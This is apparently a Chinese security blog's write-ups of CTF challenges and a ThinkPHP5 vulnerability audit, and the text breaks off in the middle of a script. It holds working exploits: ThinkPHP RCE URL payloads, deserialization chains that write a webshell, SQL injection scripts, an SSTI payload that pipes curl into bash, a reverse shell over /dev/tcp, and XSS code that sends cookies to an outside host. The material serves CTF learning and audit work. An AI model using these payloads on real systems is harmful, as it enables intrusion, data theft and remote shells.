20  import base58 text= b\"2GVdudkYo2CBXoQii7gfpkjTc4gT\" plaintext = \"\" table1 = b\"12Nrst6CDquvG7BefghJKLMEFHPQZabRSTUVmyzno89ApwxWXYcdkij345\" table2 = b\"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\" for i in range(len(text)): for j in range(len(table1)): if(text[i]==table1[j]): plaintext += chr(table2[j]) break print(plaintext) print(base58.b58decode(plaintext.encode())) flag{We1CTFc0m_2345}   顺序手动调换\nPwn 双边协议1.0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52  from pwn import* import base64 #context.log_level = 'DEBUG' def get_argv(recv_string,string): #gdb.attach(p,\"b *(0x555555554000+0x1348)\") p.sendafter(recv_string,base64.b64encode(p32(0x12345678)*2 + p64(0x30) + p64(8) + p64(0x8) + 'A'*8 + string)) def Create(size,content): get_argv('Pg==','1') get_argv('emUgPj4=',str(size)) get_argv('bnQgPj4=',content) def Free(): get_argv('Pg==','2') def Edit(content): get_argv('Pg==','3') get_argv('bnQgPj4=',content) def View(): get_argv('Pg==','4') p = process('./main') libc =ELF('./libc-2.23.so') p = remote('8.140.179.11',13452) Create(0x20,'FMYY') get_argv('Pg==','1') get_argv('emUgPj4=',str(0x1000)) get_argv('Pg==','3') #gdb.attach(p,\"b *(0x555555554000+0xD10)\") payload = '\\x00'*0x28 + p64(0x3A1) + '\\x00'*0x378 + p64(0x21) + '\\x00'*0x18 + p64(0x791) + '\\x00'*0x788 + p64(0x781) p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0xF30) + p64(8) + p64(0xF08) + 'A'*8 + payload)) Create(0x20,'\\x78') View() p.recvline() data = base64.b64decode(p.recvline()) libc_base = u64(data[-6:].ljust(8,'\\x00')) - libc.sym['__malloc_hook'] - 0x68 #+ 0x100000000 log.info('LIBC:\\t' + hex(libc_base)) Create(0x10,'\\x10') View() p.recvline() data = base64.b64decode(p.recvline()) heap_base = u64(data[-6:].ljust(8,'\\x00')) - 0xA10 log.info('HEAP:\\t' + hex(heap_base)) get_argv('Pg==','3') p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0) + p64(0x68) + p64(0x68) + 'A'*8 + 'FMYY' + '\\n')) Create(0x60,p64(libc_base + libc.sym['__malloc_hook'] - 0x23)) Create(0x60,'FMYY') Create(0x60,'FMYY') Create(0x60,'FMYY') get_argv('Pg==','3') p.sendafter('bnQgPj4=',base64.b64encode(p32(0x12345678)*2 + p64(0x50) + p64(0x8) + p64(0x28) + 'A'*8 + '\\x00'*0x13 + p64(libc_base + 0xF1207) + '\\n')) p.interactive()   Web write_shell 1  ?action=pwd   得到存储路径\n1  ?action=upload\u0026data=\u003c?=`rev%09/*gggg*`?\u003e  得到结果逆转一下就行\neasytp 扫目录得到www.zip\n看到是ThinkPHP 3.2.3\n/home/index有反序列化：\n与源码diff一下，看到改了Library\\Think\\Db\\Driver.class.php\n猜测有mysql，记得tp3.2.3有反序列化打数据库类的链：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA\n尝试了一下，可以任意文件读\n没读到有用的信息，猜测数据库密码123456\n然后可以报错注入\npoc:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64  \u003c?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u003e true // 开启才能读取文件  ); protected $config = array( \"debug\" =\u003e 1, \"database\" =\u003e \"mysql\", \"hostname\" =\u003e \"127.0.0.1\", \"hostport\" =\u003e \"3306\", \"charset\" =\u003e \"utf8\", \"username\" =\u003e \"root\", \"password\" =\u003e \"123456\" ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u003eimg = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u003ehandle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u003edb = new Mysql(); $this-\u003eoptions['where'] = ''; $this-\u003epk = 'id'; $this-\u003edata[$this-\u003epk] = array( \"table\" =\u003e \"mysql.user where 1=updatexml(1,concat(0x7e,substr((select f14g from tp.f14g),32,64),0x7e),1)#\", \"where\" =\u003e \"1=1\" ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); }   poc中查库查表语句如下：\n1 2 3 4 5  updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,64),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='tp'),1,32),0x7e),1) updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='f14g'),1,32),0x7e),1)   flag{07d47ce4-b5de-4671-9cdf-568fb9ec822f}\n","description":"红明谷杯就随便打了打，没想到混了了个线上16名，看着波能不能ban人捡漏了","tags":["代码审计"],"title":"红明谷杯 Writeup by X1cT34m","uri":"/posts/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF-writeup-by-x1ct34m/"},{"categories":["note"],"content":"本篇博文会复现大多数tp5的漏洞，持续更新\n审计环境搭建 安装thinkphp 推荐使用composer，版本切换很方便\ncomposer create-project --prefer-dist topthink/think=5.0.10 tp5.0.10\r将 composer.json 文件的 require 字段设置成如下：\n\"require\": {\r\"php\": \"\u003e=5.4.0\",\r\"topthink/framework\": \"5.0.10\"\r},\r然后执行 composer update\nPhpStorm+Xdebug调试环境 可以看我另外一篇文章：Debian下PHP Xdebug调试环境搭建\n另外VSCode+Xdebug也是一个不错且方便的选择\n框架基本流程 框架基本流程网上都讲的很清楚，我这里就不搬运了\n这两篇文章讲的很不错：\nhttps://paper.seebug.org/888/#_4\nhttps://xz.aliyun.com/t/8143\nRCE-类名解析导致任意类方法调用  ThinkPHP版本：5.0.7\u003c=5.0.x\u003c=5.0.22 、5.1.0\u003c=5.1.x\u003c=5.1.30\n参考：\nhttps://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md\nhttps://paper.seebug.org/888/#poc\nhttps://xz.aliyun.com/t/3570\n 概述 本次漏洞存在于 ThinkPHP 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 远程代码执行漏洞 的产生。漏洞影响版本： 5.0.7\u003c=ThinkPHP5\u003c=5.0.22 、5.1.0\u003c=ThinkPHP\u003c=5.1.30。不同版本 payload 需稍作调整：\n5.1.x ：\n?s=index/\\think\\Request/input\u0026filter[]=system\u0026data=pwd\r?s=index/\\think\\view\\driver\\Php/display\u0026content=\u003c?php phpinfo();?\u003e\r?s=index/\\think\\template\\driver\\file/write\u0026cacheFile=shell.php\u0026content=\u003c?php phpinfo();?\u003e\r?s=index/\\think\\Container/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=id\r?s=index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=id\r5.0.x ：\n?s=index/think\\config/get\u0026name=database.username # 获取配置信息\r?s=index/\\think\\Lang/load\u0026file=../../test.jpg # 包含任意文件\r?s=index/\\think\\Config/load\u0026file=../../t.php # 包含任意.php文件\r?s=index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=id\r5.1.x类名解析 2018年12月9日官方发布的补丁，在library/think/route/dispatch/Module.php获取控制器名处加了个一个正则waf\n洞其实不在这里\n在路由调度的时候：\n跟进到thinkphp/library/think/route/dispatch/Module.php:\n跟进controller方法：(thinkphp/library/think/App.php)\n跟进parseModuleAndClass方法：(thinkphp/library/think/App.php)\n这个方法先对$name(类名)进行判断，当$name含有\\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用，比如：\n thinkphp/library/think/Container.php：  http://127.0.0.1/public/index.php?s=index/think\\Container/invokefunction\u0026function=call_user_func_array\u0026vars[0]=phpinfo\u0026vars[1][]=1\r通过自动加载的特性，think\\Container可以直接调用thinkphp/library/think/Container.php的危险方法invokefunction，造成RCE。\n thinkphp/library/think/Request.php:  因为是private，所以查找同一类里面的用例：\n Request::input方法：  构造poc：\nhttp://127.0.0.1/public/index.php?s=index/think\\request/input\u0026data=1\u0026filter=phpinfo\u0026name=\rRequest::cookie方法：  构造poc：\nhttp://127.0.0.1/public/?s=index/think\\request/cookie\u0026name=cmd\u0026filter=phpinfo\r[HTTP header]\rCookie: cmd=1\r同样成功RCE。\n thinkphp/library/think/template/driver/File.php:  构造poc：\nhttp://127.0.0.1/public/?s=index/think\\template\\driver\\file/write\u0026cacheFile=/tmp/test.txt\u0026content=hacked\r成功写入/tmp/test.txt文件。\n5.0.x类名解析 thinkphp/library/think/Loader.php:\n原理类似，在App::run()方法里面，Loader::controller进行调度的时候，当$name含有\\时会直接将其作为类的命名空间路径，导致我们可以任意方法调用。比如：\n thinkphp/library/think/App.php:  构造poc:\nhttp://127.0.0.1/public/?s=index/think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=assert\u0026vars[1][]=phpinfo()\rhttp://127.0.0.1/public/?s=index/\\think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=phpinfo\u0026vars[1][]=1\reval因为不是函数不能直接回调，在特定php版本情况下可以使用assert直接RCE，或者利用其他函数读写文件。\n需要注意的问题 在https://xz.aliyun.com/t/3570#toc-3这篇文章里面提到：\n 因为默认配置会判断是否自动转换控制器，将控制器名变成小写\n又因为Loader.php::autoloadwin在win环境下严格区分大小写，所以导致有些类加载不到\n 但是我在Kali下经过小写转换同样也没办法加载到，可能是因为Linux本来就区分大小写？\n如此一来，着手点只有框架在加载的时候就已经加载的类了\nRCE-Request核心类变量覆盖  ThinkPHP版本：5.0.0\u003c=ThinkPHP5\u003c=5.0.23 、5.1.0\u003c=ThinkPHP\u003c=5.1.30\n参考：\nhttps://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10.md\n 概述 Request核心类**$method** 来自可控的 $_POST 数组，而且在获取之后没有进行任何检查，直接把它作为 Request 类的方法进行调用，同时，该方法传入的参数是可控数据 $_POST 。导致可以随意调用 Request 类的部分方法\npayload：\nhttp://php.local/thinkphp5.0.5/public/index.php?s=index\rpost\r_method=__construct\u0026method=get\u0026filter[]=call_user_func\u0026get[]=phpinfo\r_method=__construct\u0026filter[]=system\u0026method=GET\u0026get[]=whoami\r# ThinkPHP \u003c= 5.0.13\rPOST /?s=index/index\rs=whoami\u0026_method=__construct\u0026method=\u0026filter[]=system\r# ThinkPHP \u003c= 5.0.23、5.1.0 \u003c= 5.1.16 需要开启框架app_debug\rPOST /\r_method=__construct\u0026filter[]=system\u0026server[REQUEST_METHOD]=ls -al\r# ThinkPHP \u003c= 5.0.23 需要存在xxx的method路由，例如captcha\rPOST /?s=xxx HTTP/1.1\r_method=__construct\u0026filter[]=system\u0026method=get\u0026get[]=ls+-al\r_method=__construct\u0026filter[]=system\u0026method=get\u0026server[REQUEST_METHOD]=ls\r5.0.10变量覆盖 测试用的payload（版本5.0.10）：\nhttp://127.0.0.1/public/index.php?s=index\rPOST:\r_method=__construct\u0026filter[]=system\u0026method=get\u0026get[]=whoami\r在App::run()方法进行路由检测的时候，在Route.php大约843行调用$request-\u003emethod()方法\nthinkphp/library/think/Request.php:\n可以看到有一个可以控制的函数名$_POST[Config::get['var_method']，而var_method的值在application/config.php里面为_method:\n于是可以POST传入_method改变$this-\u003e{$this-\u003emethod}($_POST);达到任意调用此类中的方法\n而如果调用此类中的__construct方法： 有一个foreach，可以引起POST数据对Requests对象属性的变量覆盖。\n在App::run()方法里面，如果我们开启了debug模式，则会调用Request::param()方法：\n当然，即使没有开启debug，在App::run()里面的调用的exec方法同样也会调用Request::param()方法\n因为调用栈太深，就不一个个跟了\n这个方法我们需要特别关注了，因为 Request 类中的 param、route、get、post、put、delete、patch、request、session、server、env、cookie、input 方法均调用了 filterValue 方法，而该方法中就存在可利用的 call_user_func 函数\n小结 不同的payload触发流程不一样，但是核心是一样的。\n任意方法调用发生在method()，变量覆盖发生在__construct()，rce发生在filterValue()\n5.0.24反序列化利用链 反序列化复现首先需要自己构造一个反序列化触发点：\n### Windows类-任意文件删除\r 在thinkphp/library/think/process/pipes/Windows.php:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  class Windows extends Pipes { private $files = []; …… private function removeFiles() { foreach ($this-\u003efiles as $filename) { if (file_exists($filename)) { @unlink($filename); } } $this-\u003efiles = []; } …… public function __destruct() { $this-\u003eclose(); $this-\u003eremoveFiles(); } }   由于$this-\u003efiles可控，我们可以利用其实现任意文件删除\npoc：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  \u003c?php namespace think\\process\\pipes; class Pipes{ } class Windows extends Pipes { private $files = []; public function __construct() { $this-\u003efiles=['D:\\tmp\\1.txt']; } } echo base64_encode(serialize(new Windows()));   只需要一个反序列化触发点，就可以实现任意文件删除。\nOutput类__call方法任意文件写  Thinkphp 5.0.x反序列化最后触发RCE，本来要调用的Request类__call方法.\n参考：\nhttps://xz.aliyun.com/t/8143#toc-10\nhttps://www.anquanke.com/post/id/196364#h2-2\nhttp://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/\nhttps://www.anquanke.com/post/id/219327\n 还是从Windows类的__destruct入手\n在上述Windows类的removeFiles()中使用了file_exists()函数，这个函数会把$filename当作字符串处理\n利用这一点，我们可以传入一个对象来触发__toString方法，于是全局搜索__toString\n可以看到他调用了toJson方法，因为class Model是一个抽象类，不能直接调用，所以我们目光移到子类里面\n可以通过thinkphp/library/think/model/Pivot.php这个里面的类进行调用\n跟进toJson方法：\n1 2 3 4 5 6 7 8 9  class Model { …… public function toJson($options = JSON_UNESCAPED_UNICODE) { return json_encode($this-\u003etoArray(), $options); } …… }   调用了$this-\u003etoArray，跟进toArray方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  class Model { …… public function toArray() { $item = []; $visible = []; $hidden = []; $data = array_merge($this-\u003edata, $this-\u003erelation); // 过滤属性  if (!empty($this-\u003evisible)) { $array = $this-\u003eparseAttr($this-\u003evisible, $visible); $data = array_intersect_key($data, array_flip($array)); } elseif (!empty($this-\u003ehidden)) { $array = $this-\u003eparseAttr($this-\u003ehidden, $hidden, false); $data = array_diff_key($data, array_flip($array)); } foreach ($data as $key =\u003e $val) { if ($val instanceof Model || $val instanceof ModelCollection) { // 关联模型对象  $item[$key] = $this-\u003esubToArray($val, $visible, $hidden, $key); } elseif (is_array($val) \u0026\u0026 reset($val) instanceof Model) { // 关联模型数据集  $arr = []; foreach ($val as $k =\u003e $value) { $arr[$k] = $this-\u003esubToArray($value, $visible, $hidden, $key); } $item[$key] = $arr; } else { // 模型属性  $item[$key] = $this-\u003egetAttr($key); } } …… }   因为最终要触发__call，我们需要找到函数调用的地方，在toArray里面有这几处：\n经过调试过后选择最后一处$item[$key] = $value ? $value-\u003egetAttr($attr) : null\n要进入到这一处要满足的条件是：\n1 2 3 4  1.if (!empty($this-\u003eappend))//$this-\u003eappend可控，后面把他设置为'getError' 2.if (method_exists($this, $relation))//$this-\u003eappend可控，导致$relation可控 3.if (method_exists($modelRelation, 'getBindAttr'))//后面说 4.if ($bindAttr)//后面说   且不满足\n1 2 3  if (is_array($name)) elseif (strpos($name, '.')) if (isset($this-\u003edata[$key]))   其中$value是由这两行确定的：\n需要满足$modelRelation可控，经过查找，可以将$relation设为'getError'，$modelRelation就变成了$this-\u003egetError()的返回值：\n1 2 3 4  public function getError() { return $this-\u003eerror;//$this-\u003eerror可控，他决定了$modelRelation的值 }   跟进getRelationDate:\n这里又给我们增加了条件：\n  5.最后传入的$modelRelation需要是Relation类型\n  6.最后返回值$values需要经过if语句判断$this-\u003eparent \u0026\u0026 !$modelRelation-\u003eisSelfRelation() \u0026\u0026 get_class($modelRelation-\u003egetModel()) == get_class($this-\u003eparent)才能让$value可控\n 这里有两条路，一种是符合if判断直接返回，另一种是不满足，进而调用getRelation方法\n具体可参考https://www.anquanke.com/post/id/219327\n   第二条路全局查找getRelation方法且为Relation子类的类，找到了HasOne（/thinkphp/library/think/model/relation/HasOne.php）\n第一条路，符合if判断之后$value可控，得到返回值$values之后代码跳出getRelationDate方法，运行至条件3处\nif (method_exists($modelRelation, 'getBindAttr'))，发现在HasOne的父类OneToOne里面是可控的：\n那么条件4也得到了解决。代码执行到了$item[$key] = $value ? $value-\u003egetAttr($attr) : null\n控制$value就能调用__call方法；\n之前我们有提到要RCE需要调用Request类的__call方法，但是由于self::$hook[$method]不可控,无法成功利用\n于是我们可以寻找其他的方法，比如Output类的__call方法\n这里调用了block方法，跟进：\n继续跟进：\n疯狂跟进：\n$this-\u003ehandle是可控的，继续全局搜索write，寻找可控的点，找到了/thinkphp/library/think/session/driver/Memcached.php\n同样$this-\u003ehandle可控，继续全局搜索set，找到thinkphp/library/think/cache/driver/File.php\n可以file_put_contents写shell，并且$filename在getCacheKey方法当中是可控的，伪协议绕一下exit就可以了\n但是$data比较麻烦，他从传入的$value取值，set方法中的参数来自先前调用的write方法，write之前在writeln的时候就传入了true，不可控。偷一张图：\n继续跟进后面的setTagItem方法，我们可以看到它再次调用了set方法:\n且文件内容$value通过$name赋值(文件名)，所以我们可以在文件名上面下功夫，比如php://filter/write=string.rot13/resource=./\u003c?cuc cucvasb();?\u003e这种\nexp，可以实现在Windows写文件（来自网络）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120  \u003c?php namespace think\\process\\pipes { class Windows { private $files = []; public function __construct($files) { $this-\u003efiles = [$files]; //$file =\u003e /think/Model的子类new Pivot(); Model是抽象类  } } } namespace think { abstract class Model{ protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) { $this-\u003eparent = $output; //$this-\u003eparent=\u003e think\\console\\Output;  $this-\u003eappend = array(\"xxx\"=\u003e\"getError\"); //调用getError 返回this-\u003eerror  $this-\u003eerror = $modelRelation; // $this-\u003eerror 要为 relation类的子类，并且也是OnetoOne类的子类==\u003e\u003eHasOne  } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ function __construct($output, $modelRelation) { parent::__construct($output, $modelRelation); } } } namespace think\\model\\relation{ class HasOne extends OneToOne { } } namespace think\\model\\relation { abstract class OneToOne { protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) { $this-\u003eselfRelation = 0; $this-\u003equery = $query; //$query指向Query  $this-\u003ebindAttr = ['xxx'];// $value值，作为call函数引用的第二变量  } } } namespace think\\db { class Query { protected $model; function __construct($model) { $this-\u003emodel = $model; //$this-\u003emodel=\u003e think\\console\\Output;  } } } namespace think\\console{ class Output{ private $handle; protected $styles; function __construct($handle) { $this-\u003estyles = ['getAttr']; $this-\u003ehandle =$handle; //$handle-\u003ethink\\session\\driver\\Memcached  } } } namespace think\\session\\driver { class Memcached { protected $handler; function __construct($handle) { $this-\u003ehandler = $handle; //$handle-\u003ethink\\cache\\driver\\File  } } } namespace think\\cache\\driver { class File { protected $options=null; protected $tag; function __construct(){ $this-\u003eoptions=[ 'expire' =\u003e 3600, 'cache_subdir' =\u003e false, 'prefix' =\u003e '', 'path' =\u003e 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php', 'data_compress' =\u003e false, ]; $this-\u003etag = 'xxx'; } } } namespace { $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo serialize($window); echo base64_encode(serialize($window)); }   小结 在挖掘这种大型框架的反序列化链子的时候，代码量巨大，我们要在其中寻找：\n 危险函数（回调，读写文件，命令执行等） 同名方法（往往可以作为跳板） 可控参数（越多越好）  另外有一篇文章总结的挺不错https://xz.aliyun.com/t/8082\n","description":"","tags":["代码审计"],"title":"thinkphp5代码审计","uri":"/posts/thinkphp5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["ctf_writeup"],"content":"Level - Week3 Forgetful 考点：简单python-SSTI\n题目是一个记事本，添加描述的时候存在SSTI，在查看页面可以看到SSTI已经成功了：\n最为常规的payload：\n{{[].__class__.__mro__[1].__subclasses__()}}\r{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('ls /').read()}}\r{{[].__class__.__mro__[1].__subclasses__()[167].__init__.__globals__.__builtins__.__import__('os').popen('curl ip|bash').read()}}\r因为命令执行处有waf，所以可以选择直接弹shell：\nnc -lvnp 8888\rbash -i \u003e\u0026 /dev/tcp/ip/8888 0\u003e\u00261\r姿势还是比较常规；\n分享一个从[].__class__.__mro__[1].__subclasses__()查找模块位置的脚本：\n1 2 3 4 5 6 7 8 9 10 11 12  #python 3 import re str = ''' [回显内容] ''' list = re.split(',', str) for i in range(0, len(list)): if 'catch_warnings' in list[i]: print(i) break   iki-Jail 考点：MySQL注入，单引号逃逸\n熟悉的登录框，熟悉的sql注入\n发现用户字段必须要邮箱才可以，而且如果开了Burp抓包之后会出现一些问题，导致Ajax不能工作。\n于是直接使用bp对login.php发包；\n进行了简单的fuzz，过滤如下：\n由单双引号过滤想到了\\逃逸单引号，当我们用户名输入admin\\的时候，语句变成了：\n1  SELECT*FROMuserWHEREusername='admin\\'ANDpassword='xxx'  那么xxx就变成了sql语句执行，造成了注入；\n结果发现只能延时注入：\nexp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  #python3,wh1sper import requests import time host = 'https://jailbreak.liki.link/login.php' def mid(bot, top): return (int)(0.5*(top+bot)) def transToHex(flag): res = '' for i in flag: res += hex(ord(i)) res = '0x' + res.replace('0x', '') return res def sqli(): name = '' for j in range(1, 200): top = 126 bot = 32 while top \u003e bot: babyselect = '(database())'#week3sqli babyselect = \"(select group_concat(table_name) from information_schema.TABLES where table_schema like database())\"#u5ers babyselect = \"(select group_concat(column_name) from information_schema.columns where table_name like 0x7535657273)\"#usern@me,p@ssword babyselect = \"(select `p@ssword` from week3sqli.u5ers)\"#sOme7hiNgseCretw4sHidd3n babyselect = \"(select `usern@me` from week3sqli.u5ers)\"#admin payload = \"^(if((ascii(substr({},{},1))\u003e{}),1,sleep(2)))#\".format(babyselect, j, mid(bot, top)) data = { \"username\": \"admin\\\\\", \"password\": payload.replace(' ', '/**/') #^(if((ascii(1)\u003e55),sleep(3),sleep(3)))#这个确实延时成功了 } try: start = time.time() r = requests.post(url=host, data=data) print(data) print(time.time()-start) if time.time()-start \u003c 1.5: bot = mid(bot, top) + 1 else: top = mid(bot, top) except: continue name += chr(top) print(name) if __name__ == '__main__': sqli() #hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}   hgame{7imeB4se_injeCti0n+hiDe~th3^5ecRets}\nArknights 考点：PHP反序列化\n题目是一个类似于抽卡的网站，描述里面说\"r4u用git部署到了自己的服务器上\"，那么自然而然Githack把源码hack下来。\nsource.zip\n在simulator.php我们可以看到有很多类，其中第146行\n1 2 3 4 5 6 7 8  class Eeeeeeevallllllll{ public $msg=\"坏坏liki到此一游\"; public function __destruct() { echo $this-\u003emsg; } }   有一个echo操作，那么我们全局搜索__toString。第93行：\n1 2 3 4 5 6 7  class CardsPool{ …… public function __toString(){ return file_get_contents($this-\u003efile); } }   pop链很明确，就看如何触发反序列化了。\n第137行Session::extract():\n1 2 3 4 5 6 7 8 9 10 11 12  public function extract($session){ $sess_array = explode(\".\", $session); $data = base64_decode($sess_array[0]); $sign = base64_decode($sess_array[1]); if($sign === md5($data . self::secret_key)){ $this-\u003esessiondata = unserialize($data); }else{ unset($this-\u003esessiondata); die(\"go away! you hacker!\"); }   他会把session的.前面的内容反序列化，并且会做一个加盐的判断，但是密钥在103行已经给了\n1  const SECRET_KEY = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\";   那么我们可以编写一个exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  \u003c?php class Eeeeeeevallllllll { public $msg = 'a'; } class CardsPool { public $cards; private $file = 'flag.php'; } $pop = new Eeeeeeevallllllll(); $pop-\u003emsg = new CardsPool(); //echo serialize($pop); $key = \"7tH1PKviC9ncELTA1fPysf6NYq7z7IA9\"; $sign = md5(serialize($pop).$key); $payload = base64_encode(serialize($pop)).'.'.base64_encode($sign); echo $payload; /* $sess_array = explode(\".\", $payload); $data = base64_decode($sess_array[0]); echo $data,\"\\n\"; $sign = base64_decode($sess_array[1]); echo $sign,\"\\n\"; if($sign === md5($data . $key)){ unserialize($data); }else{ echo $sign; die(\"go away! you hacker!\"); } */   发送session即可得到flag\nPost to zuckonit2.0 考点：XSS\n网站是一个创建笔记的站点，存在XSS漏洞\n在/static/www.zip给了源码：source.zip\n和week2的XSS比起来多一个功能，可以替换批量字符串，并且在/preview查看替换的结果\n审计源码，在添加留言的存在一个waf：\n跟进函数：\n1 2 3 4 5 6 7 8  def escape_index(original): content = original content_iframe = re.sub(r\"^(\u003c?/?iframe)\\s+.*?(src=[\\\"'][a-zA-Z/]{1,8}[\\\"']).*?(\u003e?)$\", r\"\\1 \\2 \\3\", content)#只留src属性 if content_iframe != content or re.match(r\"^(\u003c?/?iframe)\\s+(src=[\\\"'][a-zA-Z/]{1,8}[\\\"'])$\", content): return content_iframe else: content = re.sub(r\"\u003c*/?(.*?)\u003e?\", r\"\\1\", content) return content   可以看到只允许我们添加类似于\u003ciframe scr=\"xxx\"\u003e的标签，并且xxx限制在1-8位，显然没办法直接执行JS。\n不过我们可以添加\u003ciframe scr=\"/preview \"\u003e来使得index能直接看到/preview页面：\n再通过字符串替换功能，把xxx换成javascript:xxxxx，形成\u003ciframe src='javascript:alter(1)'\u003e即可XSS\npayload：\n1  javascript:document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL2Nvb2tpZS5qcyI+PC9zY3JpcHQ+'));   小手一抖，cookie到手：\nhgame{simple_csp_bypass\u0026a_small_mistake_on_the_replace_function}\nPost to zuckonit another version 考点：XSS，HttpOnly绕过\n说是绕HttpOnly，实则并没有绕；\n相比于上一道XSS：\n  增加了HttpOnly，使得我们直接用js不能直接获取到本地cookie；\n  修改了功能，把直接替换字符串换成了查找字符串\n  依然在static/www.zip给出了源码：source.zip\n源码大同小异，甚至连waf都没变，单独在字符串替换功能上修改为正则匹配并且在两端加\u003cb\u003e标签，得到高亮效果\n如果按照正常思维来查找'a'字符串的话，效果就如下图：\n但是我们应当注意到，这个高亮实际上还是由String.prototype.replace()方法来进行正则替换的，那么我们如果输入.*之类的关键词进行高亮就会出现意想不到的效果： 没错，因为正则替换让我们得以有机可乘\n思路还是一样，先利用替换构造好XSS，再利用\u003ciframe src='/preview'\u003e来触发0-click\npayload：\n\u003ciframe src='/preview'\u003e\r\u003ciframe src='AAA' \u003e\r替换的payload：\nAAA('srcdoc='\u0026lt;img src=1 onerror=document.write(atob(\u0026#x27;PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg==\u0026#x27;));\u0026gt;')*\r替换之后其实是这样：\n实际上是利用了iframe标签的srcdoc属性和HTML实体编码来绕过\n\u003ciframe src=\"\u003cb class=\u0026quot;search_result\u0026quot;\u003eAAA(\" srcdoc=\"\u003cimg src=1 onerror=document.write(atob('PHNjcmlwdCBzcmM9Imh0dHA6Ly9pcC9teWpzL0J5cGFzc19IVFRQX09ubHkuanMiPjwvc2NyaXB0Pg=='));\u003e\" )*\u003c=\"\" b=\"\"\u003e' \u003e\u003c/iframe\u003e\r结果一目了然；\n而iframe里面\u003cscript\u003e指向的JS：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  xmlhttp = new XMLHttpRequest(); //是否能跨域 xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { location.href = 'http://ip/?cookie=' + btoa(xmlhttp.responseText) //得用btoa()进行base64编码，不然flag会很神必  //尝试getAllResponseHeaders()不行，因为HttpOnly的Set-Cookie头不适用 